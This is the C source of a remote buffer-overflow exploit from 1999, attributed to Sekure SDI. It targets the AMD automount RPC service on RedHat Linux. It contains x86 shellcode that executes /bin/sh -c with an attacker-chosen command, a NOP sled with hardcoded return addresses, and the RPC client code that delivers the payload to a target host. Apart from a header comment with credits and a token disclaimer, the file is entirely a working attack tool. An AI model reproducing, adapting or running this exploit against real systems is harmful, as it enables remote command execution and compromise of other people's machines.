/* 
 * SDI rpc.AMD automountd remote exploit for RedHat Linux
 * Sekure SDI - Brazilian Information Security Team
 * by c0nd0r <condor@sekure.org> - Jul/99
 *  
 * AMD doesn't check bounds in the plog() function, so we may
 * call the procedure 7 and exploit this vulnerability.
 * It has been tested under rh5.2/5.0 but this vulnerability exists in 
 * all versions.
 * 
 * Greets: jamez, bishop, bahamas, stderr, dumped, paranoia, marty(nordo),
 *         vader, fcon, slide, corb, soft distortion and specially to
 *         my sasazita!  Also lots of thanks to toxyn.org(frawd,r00t),
 *         pulhas.org, phibernet, superbofh(seti) and el8.org (duke). 
 *         #uground (brasnet), #sdi(efnet), #(phibernet).
 *           
 * usage: SDIamd -h <host> -c <command> [-p <port>] [-o <offset>]
 *        where -p <port> will bypass the portmap.
 * 
 * Warning: We take no responsability for the consequences on using this 
 *          tool. DO NOT USE FOR ILICIT ACTIVITIES!
 *
 * Agradecimentos a todo o pessoal que vem acompanhando a lista brasileira
 * de seguranca - BOS-BR <bos-br-request@sekure.org>. Fiquem ligado na
 * nova pagina do grupo!
 */ 

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>

#define AMQ_PROGRAM ((u_long)300019)
#define AMQ_VERSION ((u_long)1)
#define AMQPROC_MOUNT ((u_long)7)
#define AMQ_STRLEN 1024
#define XDRPROC_T_TYPE xdrproc_t
#define voidp void *
#define NOP 0x90

char shellcode[] =
        "\xeb\x31\x5e\x89\x76\xac\x8d\x5e\x08\x89\x5e\xb0"
        "\x8d\x5e\x0b\x89\x5e\xb4\x31\xc0\x88\x46\x07\x88"
        "\x46\x0a\x88\x46\xab\x89\x46\xb8\xb0\x0b\x89\xf3"
        "\x8d\x4e\xac\x8d\x56\xb8\xcd\x80\x31\xdb\x89\xd8"
        "\x40\xcd\x80\xe8\xca\xff\xff\xff/bin/sh -c ";

//typedef bool_t (*xdrproc_t) __P ((XDR *, __ptr_t, ...));
typedef char *amq_string;
typedef long *time_type;
typedef struct amq_mount_tree amq_mount_tree;
typedef amq_mount_tree *amq_mount_tree_p;

struct amq_mount_tree {
  amq_string mt_mountinfo;
  amq_string mt_directory;
  amq_string mt_mountpoint;
  amq_string mt_type;
  time_type mt_mounttime;
  u_short mt_mountuid;
  int mt_getattr;
  int mt_lookup;
  int mt_readdir;
  int mt_readlink;
  int mt_statfs;
  struct amq_mount_tree *mt_next;
  struct amq_mount_tree *mt_child;
};

bool_t
xdr_amq_string(XDR *xdrs, amq_string *objp)
{
  if (!xdr_string(xdrs, objp, AMQ_STRLEN)) {
    return (FALSE);
  }
  return (TRUE);
}

bool_t
xdr_time_type(XDR *xdrs, time_type *objp)
{
  if (!xdr_long(xdrs, (long *) objp)) {
    return (FALSE);
  }
  return (TRUE);
}

bool_t
xdr_amq_mount_tree(XDR *xdrs, amq_mount_tree *objp)
{

  if (!xdr_amq_string(xdrs, &objp->mt_mountinfo)) {
    return (FALSE);
  }

  if (!xdr_amq_string(xdrs, &objp->mt_directory)) {
    return (FALSE);
  }

  if (!xdr_amq_string(xdrs, &objp->mt_mountpoint)) {
    return (FALSE);
  }

  if (!xdr_amq_string(xdrs, &objp->mt_type)) {
    return (FALSE);
  }

  if (!xdr_time_type(xdrs, &objp->mt_mounttime)) {
    return (FALSE);
  }

  if (!xdr_u_short(xdrs, &objp->mt_mountuid)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_getattr)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_lookup)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_readdir)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_readlink)) {
    return (FALSE);
  }

  if (!xdr_int(xdrs, &objp->mt_statfs)) {
    return (FALSE);
  }

  if (!xdr_pointer(xdrs, (char **) &objp->mt_next, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {
    return (FALSE);
  }

  if (!xdr_pointer(xdrs, (char **) &objp->mt_child, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {
    return (FALSE);
  }

  return (TRUE);
}

bool_t
xdr_amq_mount_tree_p(XDR *xdrs, amq_mount_tree_p *objp)
{
  if (!xdr_pointer(xdrs, (char **) objp, sizeof(amq_mount_tree), (XDRPROC_T_TYPE) xdr_amq_mount_tree)) {
    return (FALSE);
  }
  return (TRUE);
}


int usage ( char *arg) {
  printf ( "Sekure SDI - AMD remote exploit for linux\n");
  printf ( "usage: %s -h <host> -c <command> [-o <offset>] [-p <port>] [-u] \n", arg);
  printf ( " where: [port] will bypass portmap\n");
  printf ( "        [-u  ] will use udp instead of tcp\n");
  exit (0);
}


int *amqproc_mount_1(voidp argp, CLIENT *clnt);


int main ( int argc, char *argv[] ) {
  CLIENT *cl;
  struct timeval tv;
  struct sockaddr_in sa;
  struct hostent *he; 
  char buf[8000], *path = buf, comm[200], *host, *cc;
  int sd, res, x, y, offset=0, c, port=0, damn=0, udp=0;  
  long addr = 0xbffff505;

  while ((c = getopt(argc, argv, "h:p:c:o:u")) != -1)
    switch (c) {
    case 'h':
      host = optarg;
      break;

    case 'p':
      port = atoi(optarg);
      break;

    case 'c':
      cc = optarg;
      break;

    case 'o':
      offset = atoi ( optarg);
      break;

    case 'u':
      udp = 1;
      break;

    default:
      damn = 1;
      break;
   }

  if (!host || !cc || damn) usage ( argv[0]);

  sa.sin_family = AF_INET;
  he = gethostbyname ( host);
  if (!he) {
   if ( (sa.sin_addr.s_addr = inet_addr ( host)) == INADDR_NONE) {
    printf ( "unknown host, try again pal!\n");
    exit ( 0);
   }
  } else 
   bcopy ( he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length); 
  sa.sin_port = htons(port);
  sd = RPC_ANYSOCK;
  tv.tv_sec = 10;
  tv.tv_usec = 0;

  snprintf ( comm, sizeof(comm), "%s", cc);
  if ( strlen(comm) >= 160) {
    printf ( "command too long\n");
    exit (0);
  } else {
   comm[strlen(comm)] = ';';
   for ( x = strlen(comm); x < 160; x++)
    comm[x] = 'A'; 
  }  

  addr += offset;
  for ( x = 0; x < (1001-(strlen(shellcode)+strlen(comm))); x++)
   buf[x] = NOP;

  for ( y = 0; y < strlen(shellcode); x++, y++)
   buf[x] = shellcode[y];

  for ( y = 0; y < strlen(comm); x++, y++)
   buf[x] = comm[y];  

  printf ( "SDI automountd remote exploit for linux\n");
  printf ( "Host %s \nRET 0x%x \nOFFset %d \n", host, addr, offset); 

  for ( ; x < 1020; x+=4) {
   buf[x  ] = (addr & 0x000000ff);
   buf[x+1] = (addr & 0x0000ff00) >> 8;
   buf[x+2] = (addr & 0x00ff0000) >> 16;
   buf[x+3] = (addr & 0xff000000) >> 24;
  }

  buf[strlen(buf)] = '\0';  
  
  if (!udp) {
   if ((cl = clnttcp_create(&sa, AMQ_PROGRAM, AMQ_VERSION, &sd, 0, 0)) ==
        NULL)
   {
     clnt_pcreateerror("clnt_create");
     exit (-1);
   }
  } else {
   if ((cl = clntudp_create(&sa, AMQ_PROGRAM, AMQ_VERSION, tv, &sd)) ==
       NULL)
   {
     clnt_pcreateerror("clnt_create");
     exit (-1);
   }
  }
  printf ( "PORT %d \n", ntohs(sa.sin_port));
  printf ( "Command: %s \n", cc); 
 
  amqproc_mount_1 (&path, cl); 
  
  clnt_destroy ( cl);
  
}

  
int *
amqproc_mount_1(voidp argp, CLIENT *clnt)
{
  static int res;
  struct timeval TIMEOUT = {10, 0};

  memset((char *) &res, 0, sizeof(res));
  if (clnt_call(clnt, AMQPROC_MOUNT, (XDRPROC_T_TYPE) xdr_amq_string, argp,
                (XDRPROC_T_TYPE) xdr_int, (caddr_t) & res,
                TIMEOUT) != RPC_SUCCESS) {
    printf ( "voce e' um hax0r!\n");
    printf ( "don't forget to restart amd: /etc/rc.d/init.d/amd start\n");
    clnt_perror ( clnt, "clnt_call");
    return (NULL);
  } 
  printf ( "exploit failed\n");
  return (&res);
}












































